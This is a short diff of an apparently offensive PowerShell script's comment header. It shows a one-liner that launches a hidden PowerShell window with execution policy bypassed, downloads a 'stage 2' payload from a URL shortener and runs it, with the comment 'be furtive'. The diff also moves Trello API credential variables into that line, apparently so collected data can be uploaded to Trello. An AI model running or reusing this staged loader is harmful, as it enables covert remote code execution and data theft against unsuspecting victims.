@@ -22,15 +22,10 @@ THIS Stage2 url :
 
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/wBFLV | iex
+powershell -w h -NoP -Ep Bypass $idList='';$key='';$token='';irm https://shorturl.at/wBFLV | iex
 
 
 #>
-
-# You need to changes those variables in the Upload-Trello function : 
-# $idList = "$idList"
-# $key = "$key"
-# $token = "$token"
 
 # Function to handle the temporary directory
 function TempDir {
